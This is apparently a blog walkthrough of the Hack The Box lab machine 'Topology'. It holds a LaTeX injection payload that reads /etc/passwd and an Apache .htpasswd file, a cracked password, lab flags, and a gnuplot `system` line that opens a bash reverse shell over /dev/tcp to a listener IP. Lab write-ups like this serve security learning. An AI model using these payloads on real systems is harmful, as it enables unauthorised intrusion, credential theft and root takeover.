---
title: HTB 5 - Topology
tag: htb
category: cyber
---

## Comments

This was an interesting box because the initial foothold comes from a lesser known language (no spoilers).

I also managed to solve all except the foothold which I used a very minor hint (related to syntax). Otherwise, the box was pretty straightforward, no completely new concepts.

## Walkthrough

Target IP: 

    10.10.11.217

### Enumeration

Start with nmap scan:

    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: HEAD GET POST OPTIONS
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Miskatonic University | Topology Group
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Normal response, we see `ssh` and `http` ports open.

The site at `10.10.11.217` loads and there is nothing extraordinary there.

We have a more interesting page at `http://latex.topology.htb/equation.php`. Add that to the `/etc/hosts` file.

This page is a LaTeX app that converts LaTeX formatted inputs into math equations.

It uses purely `GET` commands and user input is passed into the 
`eqn` parameter.

Interestingly, there is also a `latex.topology.htb/` index page which shows all the other files within this directory, including the main `/equation.php` page.

    [DIR]	demo/	2023-01-17 12:26 	- 	 
    [ ]	equation.php	2023-06-12 07:37 	3.8K	 
    [ ]	equationtest.aux	2023-01-17 12:26 	662 	 
    [ ]	equationtest.log	2023-01-17 12:26 	17K	 
    [ ]	equationtest.out	2023-01-17 12:26 	0 	 
    [ ]	equationtest.pdf	2023-01-17 12:26 	28K	 
    [IMG]	equationtest.png	2023-01-17 12:26 	2.7K	 
    [TXT]	equationtest.tex	2023-01-17 12:26 	112 	 
    [IMG]	example.png	2023-01-17 12:26 	1.3K	 
    [TXT]	header.tex	2023-01-17 12:26 	502 	 
    [DIR]	tempfiles/	2023-10-12 03:27 	- 

`equationtest.log` shows that the backend is calling a library called `pdfTex`. This library renders text into pdfs.

Knowing that `/equation.php` passes the user input to the backend, there is potential for LaTeX injection.

### Foothold

This is the foothold that uses a lesser known language. Luckily, there is a list of injection payloads we can try, courtesy of [this repo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection).

The most straightforward ones that immediately give you shell access don't work.

    \write18
    \input

Both options result in `Illegal command.`. Hence, we know there are some restrictions over what can be injected.

Next, I tried a basic file write using `\newwrite\outfile`. This creates a new file in the `/tempfiles` directory, so I know that there are some commands that can still be injected.

If you look at the docs for `pdfTex` and also in the `.log` file, it is mentioned that shell-escape commands are restricted for security purposes, meaning not all commands (like `\write18`) will be allowed by the server.

With that, I tried all the other options in the repo. I was stuck here for a long time and forced to look at the hints. I realised the solution was right in front of me the whole time... In `equationtest.tex`, the formatting for the input is explicitly stated: strings must be enclosed with `$`. 

    $ \int_{a}^b\int_{c}^d f(x,y)dxdy $

It even says so in the first line of the repo - not sure how I missed that, but it's an important lesson to be more careful with syntax - my major weakness.

> You might need to adjust injection with wrappers as \[ or $.

Once that was solved, I went back to try the default payload that lets us read the `/etc/passwd` file.

    $\lstinputlisting{/etc/passwd}$

In the output pdf/ image, we see that there is a user named `vdaisley`. I tried my luck to get `/vdaisley/user.txt` using the same payload method, but it wasn't so simple.

Next, I had an idea to apply the same payload to read out other files that may contain user passwords.

In the `/etc/passwd` file, I noticed there was a `www-data` user that is the default user for the Apache server. Apache stores credentials in `.htpasswd` so we may be able to read from it.

I checked the various default config files in `/etc/apache2`, as well as the default folder that Apache user stores files in `/var/www/html` but there was not `.ht` files.

At this point I was stuck trying to find the correct path to apply the payload to. I then realised that I never did a DNS scan at the start, so I ran one with FFUF with a word length filter of 1612 (this just removes the false positive subdomains)

    ./ffuf -c -w ~/Downloads/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://topology.htb -H "Host: FUZZ.topology.htb" -fw 1612

    dev                     [Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 1596ms]
    stats                   [Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 1580ms]

This was the missing piece! We have 2 more subdomains in addition to `latex.`.

`stats.topology.htb` hosts a basic server load chart 

`dev.topology.htb` is an admin page that requires login, specifically Apache authentication.

I was actually on the right track searching for `.htpasswd` in the `/www/var/` directories, but I didn't understand how `/www/var/` is usually structured. Because the `dev.` subdomain is the one that requires authentication, this means that `/www/var/dev` is the directory that holds the `.htpasswd` file and **not** `/www/var/html` which is the main page that loads at `http://topology.htb`. It's a good lesson to always have a local install of the system you are trying to hack so that you have visibility of the internal structures while attempting exploits.

Trying the payload on `/www/var/dev/.htpasswd`, we get a hash:

     $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

`john` with `rockyou.txt` cracks this quickly and we get the password: `calculus20`.

### Privilege Escalation

Using `vdaisley:calculus20` lets us log into the `dev.` site, but it's pretty boring there. Let's try to SSH with the same credentials... and it works. We get user.txt = 1a6a16a31517f29e51af95bd0e2e4bbf

From here, we do the usual privilege escalation checks to find the `user` has no sudo privilege. 

Next, check existing processes and regularly triggered processes. 
We download `pspy64` into the target which, when run, will show all command executions in the target as soon as they happen.

    2023/10/13 12:41:22 CMD: UID=0     PID=1      | /sbin/init 
    2023/10/13 12:42:01 CMD: UID=0     PID=20829  | /bin/sh /opt/gnuplot/getdata.sh 
    2023/10/13 12:42:01 CMD: UID=0     PID=20828  | /bin/sh -c /opt/gnuplot/getdata.sh 
    2023/10/13 12:42:01 CMD: UID=0     PID=20827  | /usr/sbin/CRON -f 
    2023/10/13 12:42:01 CMD: UID=0     PID=20826  | /usr/sbin/CRON -f 
    2023/10/13 12:42:01 CMD: UID=0     PID=20834  | /usr/sbin/CRON -f 
    2023/10/13 12:42:01 CMD: UID=0     PID=20833  | cut -d   -f3,7 
    2023/10/13 12:42:01 CMD: UID=0     PID=20832  | tr -s   
    2023/10/13 12:42:01 CMD: UID=0     PID=20831  | 
    2023/10/13 12:42:01 CMD: UID=0     PID=20835  | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
    2023/10/13 12:42:01 CMD: UID=0     PID=20836  | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
    2023/10/13 12:42:01 CMD: UID=0     PID=20840  | sed s/,//g 
    2023/10/13 12:42:01 CMD: UID=0     PID=20839  | cut -d  -f 3 
    2023/10/13 12:42:01 CMD: UID=0     PID=20838  | grep -o load average:.*$ 
    2023/10/13 12:42:01 CMD: UID=0     PID=20837  | uptime 
    2023/10/13 12:42:01 CMD: UID=0     PID=20841  | /bin/sh /opt/gnuplot/getdata.sh 
    2023/10/13 12:42:01 CMD: UID=0     PID=20842  | /bin/sh /opt/gnuplot/getdata.sh 
    2023/10/13 12:42:01 CMD: UID=0     PID=20843  | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 

This looks like the set of functions that allows periodic update of the `stats.` graph. Furthermore, all of these are being run as root (`UID=0`)

There are 2 potential options here.
1. We have getdata.sh which is a custom function that we may be able to exploit.
2. We can write malicious code into a `.plt` file and leave it in `/opt/gnuplot`, then wait until it gets executed by 

        find /opt/gnuplot -name *.plt -exec gnuplot {} 

Which essentially searches the directory for any files ending with `.plt` and then executing them with `gnuplot`.

We somehow have write access to /opt/gnuplot but no read access.

    ls -l
    total 4
    drwx-wx-wx 2 root root 4096 Oct 13 11:20 gnuplot

This makes option (2) simple. Just write a reverse shell and save it as `revshell.plt`. `gnuplot` can be escaped using the `system` command as per GTFObin.

    system "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"

And we have root.txt = 6adaa775b1b2ce9a83f312ec058a3876

Simple enough.

*That's all for tonight, ciao.*


